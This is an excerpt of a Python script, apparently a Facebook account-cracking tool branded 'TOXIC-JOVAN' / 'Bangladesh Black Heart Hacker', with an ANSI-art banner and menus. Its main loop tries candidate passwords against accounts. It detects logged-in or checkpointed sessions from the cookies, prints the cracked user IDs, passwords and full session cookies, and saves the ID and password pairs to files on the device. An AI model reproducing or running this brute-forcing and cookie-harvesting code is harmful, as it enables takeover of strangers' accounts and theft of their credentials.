...
AUTHOR    : TOXIC-JOVAN
FACEBOOK : Jovan Ahmed 
VERSION    : 1.1
                                   [BANGLADESH BLACK HEART HACKER]
...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/i.love.allah.its.jovan.vau')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/i.love.allah.its.jovan.vau')
        return None
    if opt == '3':
...
today = date.today()
logo =                    
\033[31;1m    _  _____      ___  _   _   _ 
\033[31;1m     | |/ _ \ \    / / || | | \ | |
\033[31;1m    | | | | \ \  / /| || |_|  \| |
\033[31;1m  | | | | |\ \/ / |__   _| . ` |
\033[31;1m | |__| | |_| | \  /     | | | |\  |
\033[31;1m  \____/ \___/   \/      |_| |_| \_|
                                    
                                    

                                                                                                                                                                                                                                                                                                                        
\033[1;37m================= \33[32;45mBHHH-TEAM\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mJOVAN Ahmed
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m JOVAN AHMED  
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTOXIC-JOVAN 
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35Bangladesh Black Heart Hacker
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mBHHH-TEAM\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO TOXIC-JOVAN\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(TOXIC-JOVAN-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TOXIC-JOVAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BBHH-TEAM-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BBHH-TEAM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[BHHH-TEAM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
